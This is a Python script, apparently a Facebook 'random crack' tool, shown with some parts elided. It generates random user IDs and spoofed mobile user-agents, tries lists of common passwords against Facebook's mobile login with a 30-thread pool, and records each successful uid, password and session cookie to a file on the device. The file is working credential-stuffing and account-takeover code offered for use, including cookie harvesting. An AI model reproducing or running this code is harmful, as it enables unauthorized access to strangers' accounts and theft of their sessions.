...
#GITHUB-MAMA-143
#ACTIVE RANDOM CLONE
#ONLY ACTIVE ACCOUNT FOR GAME ACCOUNT 
...
for ua in range(10000):
    ...
    l='.0'
    mama=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
    ugen.append(mama)
...
for ua in range(10000):
	...
	g=random.randrange(20,100)
	h='Mobile Safari/537.36'
	mama=(f"{a} {b}; {y} {c}{d}.{e}.{f}.{g} {h}")
	ugen.append(mama)
os.system("xdg-open https://www.facebook.com/NIROBSHEIKH112200?mibextid=ZbWKwL")
...
|__| \__| |__| | _| `._____| \______/  |______/                                                    
 \033[0;92m═════════════════════════════════════════════
\033[0;92m • NIROB SHEIKH(😌)
\033[0;92m • 𝚁𝙰𝙽𝙳𝙾𝙼 𝙲𝚁𝙰𝙲𝙺 𝙰𝙶𝙴𝙽𝚃(🔥)
...
def Main():
        ...
        if mama in ["1","01"]:
            sexy()
        if mama in ["2","02"]:
        	os.system('xdg-open https://wa.me/+8801602403844')
        if mama in [" 0", "00"]:
            exit()
        else:
            exit()     
def sexy():
    ...
    with ThreadPool(max_workers=30) as asha:
        ...
        for love in user:
            ...
            pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Free Fire','freefire','jannat','fariya','Sumaiya','riya@@@','@@###','fahadvai','Tik Tok','Gaming','5753200','mama@@@','Bangladesh']
            asha.submit(alh4aj,uid,pwx,tl)
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(' [] OK NIROB-OK.txt')
    print(' [] CP NIROB-CK.txt')
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
def alh4aj(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;32m[NIROB-BRO]\033[1;36m[%s/%s]\033[1;32m[OK-%s]\033[1;35m \r'%(loop,tl,len(oks))),
            sys.stdout.flush()
            ...
            header_freefb = {'authority':'p.facebook.com','method': 'POST','scheme': 'https','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'en-US,en;q=0.9','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','origin': 'https://p.facebook.com','referer': 'https://p.facebook.com/','accept-encoding': 'gzip, deflate, br','sec-ch-prefers-color-scheme': 'light','sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"','sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"','sec-ch-ua-mobile': '?1','sec-ch-ua-model': '""','sec-ch-ua-platform': '"Android"','sec-ch-ua-platform-version': '""','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent':'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36','viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[1;33m[\033[1;32mNIROB-OK \033[1;33m]\033[1;92m {uid}\033[1;95m|\033[1;92m {ps} ")
                print(f"\033[1;92mCOOKIE :\033[1;95m {coki}")
                open('/sdcard/NIROB-OK.txt', 'a').write( uid+' | '+ps+'|'+coki+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\033[1;33m[\033[1;32mNIROB-CP\033[1;33m]\033[1;91m {uid}|{ps}")
